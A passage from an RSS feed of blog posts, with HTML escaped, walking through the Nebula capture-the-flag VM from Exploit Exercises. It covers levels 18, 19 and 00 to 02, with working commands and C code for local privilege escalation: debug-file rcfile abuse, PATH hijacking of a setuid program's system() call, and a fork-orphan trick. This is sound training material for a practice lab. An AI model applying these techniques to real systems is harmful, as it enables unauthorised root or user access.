	--noediting
	--noprofile
	--norc
	--posix
	--protected
	--rcfile
	--restricted
	--verbose
	--version
Shell options:
	-irsD or -c command or -O shopt_option		(invocation only)
	-abefhkmnptuvxBCHP or -o option
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Right, so we need to remember that we&amp;rsquo;re running &lt;code&gt;sh&lt;/code&gt; here, and our arguments
are being passed to it. Unfortunately &lt;code&gt;-d&lt;/code&gt; and such are not valid here.
Time to read the manual&amp;hellip;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&amp;ndash;rcfile file&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Execute commands from file instead of the system wide
initialization file /etc/bash.bashrc and the standard personal
initialization file ~/.bashrc if the shell is interactive
(see INVOCATION below).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ok, well, it&amp;rsquo;s worth a shot.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level18@nebula:/home/flag18$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print(&amp;#39;login me\n&amp;#39;*1021 + &amp;#39;closelog\n&amp;#39; + &amp;#39;shell&amp;#39;)&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./flag18 --rcfile -d /tmp/flag18/debug
./flag18: invalid option -- &amp;#39;-&amp;#39;
./flag18: invalid option -- &amp;#39;r&amp;#39;
./flag18: invalid option -- &amp;#39;c&amp;#39;
./flag18: invalid option -- &amp;#39;f&amp;#39;
./flag18: invalid option -- &amp;#39;i&amp;#39;
./flag18: invalid option -- &amp;#39;l&amp;#39;
./flag18: invalid option -- &amp;#39;e&amp;#39;
/tmp/flag18/debug: line 1: Starting: command not found
/tmp/flag18/debug: line 2: syntax error near unexpected token `(&amp;#39;
/tmp/flag18/debug: line 2: `logged in successfully (without password file)&amp;#39;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Heavens, it worked - sort of. Notice the &lt;em&gt;/tmp/flag18/debug: line 1: Starting: command not found&lt;/em&gt;? That&amp;rsquo;s because our &lt;em&gt;rcfile&lt;/em&gt; is set to be our debug file. So
it writes to the debug file and then the shell will try to execute it. As we know
the first line in the file is &lt;em&gt;Starting up. Verbose level = 1&lt;/em&gt;, so all we really
need to do to quash that error we need to create an executable with that name.
Inside that we will run out beloved &lt;code&gt;getflag&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level18@nebula:/home/flag18$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo &lt;/span&gt;getflag &amp;gt; /tmp/Starting
level18@nebula:/home/flag18$ chmod +x !&lt;span style=&#34;color: #960050; background-color: #1e0010&#34;&gt;$&lt;/span&gt;
chmod +x /tmp/Starting
level18@nebula:/home/flag18$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;export PATH&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;PATH&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;}&lt;/span&gt;:/tmp
level18@nebula:/home/flag18$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print(&amp;#39;login me\n&amp;#39;*1021 + &amp;#39;closelog\n&amp;#39; + &amp;#39;shell&amp;#39;)&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./flag18 --rcfile -d /tmp/flag18/debug
./flag18: invalid option -- &amp;#39;-&amp;#39;
./flag18: invalid option -- &amp;#39;r&amp;#39;
./flag18: invalid option -- &amp;#39;c&amp;#39;
./flag18: invalid option -- &amp;#39;f&amp;#39;
./flag18: invalid option -- &amp;#39;i&amp;#39;
./flag18: invalid option -- &amp;#39;l&amp;#39;
./flag18: invalid option -- &amp;#39;e&amp;#39;
You have successfully executed getflag on a target account
/tmp/flag18/debug: line 2: syntax error near unexpected token `(&amp;#39;
/tmp/flag18/debug: line 2: `logged in successfully (without password file)&amp;#39;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The harder ways are beyond what I can do, but for those interested in
circumventing &lt;code&gt;FORTIFY_SOURCE&lt;/code&gt; you can read &lt;a href=&#34;http://phrack.org/issues/67/9.html&#34;&gt;A Eulogy for Formatting Strings&lt;/a&gt;. I&amp;rsquo;ll be re-reading that for sure.&lt;/p&gt;

&lt;h2 id=&#34;flag-19:eaf9fabfe6e85567a2c1f06adf83e2d8&#34;&gt;Flag 19&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a flaw in the below program in how it operates.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;fcntl.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;envp)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;pid_t&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;pid;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;256&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;stat&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;statbuf;&lt;/span&gt;

  &lt;span style=&#34;color: #75715e&#34;&gt;/* Get the parent&amp;#39;s /proc entry, so we can verify its user id */&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;snprintf(buf,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buf)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/proc/%d&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getppid());&lt;/span&gt;

  &lt;span style=&#34;color: #75715e&#34;&gt;/* stat() it */&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(stat(buf,&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;statbuf)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Unable to check parent process&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(EXIT_FAILURE);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #75715e&#34;&gt;/* check the owner id */&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(statbuf.st_uid&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #75715e&#34;&gt;/* If root started us, it is ok to start the shell */&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;execve(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;envp);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;err(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Unable to execve&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;You are unauthorized to run this program&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So we can get the shell we want if we can run this as root. How can we do that?
This exploits involves a knowledge of Linux forks. Basically if a process
forks and the parent dies, the child will automatically be run under &lt;code&gt;init&lt;/code&gt;.
This is called &lt;a href=&#34;http://wiki.linuxquestions.org/wiki/Fork_off_and_die&#34;&gt;Fork off and die&lt;/a&gt;. So who does &lt;code&gt;init&lt;/code&gt; run as?&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level19@nebula:/tmp/flag19$ ps aux &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; grep init
root         1  0.0  0.6   3196  1512 ?        Ss   00:32   0:00 /sbin/init
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;In order to make use of this we need to run &lt;code&gt;flag18&lt;/code&gt; as a forked process and
then kill the parent. The arguments to &lt;code&gt;flag18&lt;/code&gt; are passed onto the shell
it executes, and thus we can make use of this. I&amp;rsquo;ll write some C code
to fork the &lt;code&gt;flag18&lt;/code&gt; process to which we will pass the &lt;code&gt;getflag&lt;/code&gt;. It should
work.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;envp)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;childPID&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fork();&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(childPID&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;// forked&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(childPID&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;// child&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;sleep(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;setresuid(geteuid(),geteuid(),geteuid());&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;args[]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;-c&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/getflag&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL};&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;execve(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/home/flag19/flag19&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;args,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;envp);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Get the idea? Right, let&amp;rsquo;s taste this pudding&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level19@nebula:/tmp/flag19$ gcc forkit.c -o forkit
level19@nebula:/tmp/flag19$ ./forkit
level19@nebula:/tmp/flag19$ You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Nebula done.&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&#34;closing-words:eaf9fabfe6e85567a2c1f06adf83e2d8&#34;&gt;Closing words&lt;/h2&gt;

&lt;p&gt;Firstly: Thanks for taking the time to read this. Please leave any feedback or
comments below (or twitter/email if you prefer).&lt;/p&gt;

&lt;p&gt;Secondly: If you are here because you are also playing &lt;em&gt;Nebula&lt;/em&gt; and are
new to this like I am, this write up might seem like magic.
You&amp;rsquo;re struggling to figure out how to get past a certain
level and then this text makes it seem like magic.&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s not like that. I spent a lot of time working through the later levels as I
quickly learned how little I knew. Much time was spent researching and learning
about things I thought I already knew. Turns out I knew very little about them.
There were a lot of failures on the way, but if I kept those in, this post
would be much much longer. The thought process seems very simple in write ups,
but trust me, there&amp;rsquo;s quite a bit of puzzling and thinking to do.&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s early days for me too, and I very much enjoyed &lt;em&gt;Nebula&lt;/em&gt;, and have a whole
new set of tools and ideas in my arsenal for the next challenge.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Cracking Nebula Part 1</title>
      <link>http://unlogic.co.uk/2014/06/24/cracking-nebula-part1/</link>
      <pubDate>Tue, 24 Jun 2014 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2014/06/24/cracking-nebula-part1/</guid>
      <description>

&lt;p&gt;On &lt;a href=&#34;http://www.exploit-exercises.com/&#34;&gt;Exploit Exercises&lt;/a&gt; you can find a
number of CTF (Capture The Flag) VM images where you can practice your
exploiting, hacking and general computer savviness. I&amp;rsquo;ve been working
my way through the Nebula machine and figured I might as well write
up the process both for other&amp;rsquo;s benefit if they get stuck, and also as
a sort of diary for myself, so I can refer back to any info if I need to.&lt;/p&gt;

&lt;p&gt;The Nebula VM can be downloaded from the &lt;a href=&#34;http://www.exploit-exercises.com/download&#34;&gt;Exploit Exercises download page&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;To quickly explain what you need to do: Login in as user &lt;code&gt;levelxx&lt;/code&gt; and then run &lt;code&gt;getflag&lt;/code&gt; as user &lt;code&gt;flagxx&lt;/code&gt;.
There&amp;rsquo;s some explanations for each level on the machine&amp;rsquo;s page over at Exploit Exercises.&lt;/p&gt;

&lt;h2 id=&#34;level-00:30500b9ac805cc116818bc6edd5ba7d1&#34;&gt;Level 00&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;This level requires you to find a Set User ID program that will run as the &amp;ldquo;flag00&amp;rdquo; account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.&lt;/p&gt;

&lt;p&gt;Alternatively, look at the find man page.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So somewhere from the root directory is a file will run as the flag00 user. As stated you can either look for it, or
use &lt;code&gt;find&lt;/code&gt; to search for it. I chose to do a little bit of both. Running &lt;code&gt;find&lt;/code&gt; from the root of a system can take some time so I chose to take a look first. Amongst the usual directories at linux root level is a &lt;code&gt;rofs&lt;/code&gt; directory. So let&amp;rsquo;s take a look inside.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;flag00@nebula:/rofs$ ls
bin   dev  home        lib    mnt  proc  run   selinux  sys  usr  vmlinuz
boot  etc  initrd.img  media  opt  root  sbin  srv      tmp  var
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Looks the same, but let&amp;rsquo;s run a find in here.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level00@nebula:/rofs$ find -user flag00 -print 2&amp;gt; /dev/null
./bin/.../flag00
./home/flag00
./home/flag00/.bash_logout
./home/flag00/.bashrc
./home/flag00/.profile
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There&amp;rsquo;s the usual stuff, but there&amp;rsquo;s also &lt;code&gt;./bin/.../flag00&lt;/code&gt;. If you run this you can get the flag:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level00@nebula:/rofs$ ./bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:/rofs$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h2 id=&#34;level-01:30500b9ac805cc116818bc6edd5ba7d1&#34;&gt;Level 01&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;envp)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;gid_t&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;uid_t&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid;&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getegid();&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;geteuid();&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;setresgid(gid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;setresuid(uid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid);&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;system(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/usr/bin/env echo and now what?&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So let&amp;rsquo;s see about this vulnerability. It doesn&amp;rsquo;t accept user input, but luckily there&amp;rsquo;s only one place where it actually runs anything, so that makes it easier to narrow down where its weakness is. The &lt;code&gt;system&lt;/code&gt; call executes an &lt;code&gt;echo&lt;/code&gt; but there&amp;rsquo;s a small oversight. It calls &lt;code&gt;echo&lt;/code&gt; without an explicit path, can you see where this is going? As &lt;code&gt;flag01&lt;/code&gt; runs as user &lt;code&gt;flag01&lt;/code&gt;, anything it executes will also run under that user.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level01@nebula:/home/flag01$ mkdir /tmp/mybin
level01@nebula:/home/flag01$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /tmp/mybin
level01@nebula:/tmp/mybin$ which getflag
/bin/getflag
level01@nebula:/tmp/mybin$ cp /bin/getflag &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo&lt;/span&gt;
level01@nebula:/tmp/mybin$&lt;span style=&#34;color: #f8f8f2&#34;&gt; cd&lt;/span&gt; ~flag01
level01@nebula:/home/flag01$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;export PATH&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;/tmp/mybin:&lt;span style=&#34;color: #e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;PATH&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;}&lt;/span&gt;
level01@nebula:/home/flag01$ ./flag01
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h2 id=&#34;level-02:30500b9ac805cc116818bc6edd5ba7d1&#34;&gt;Level 02&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;

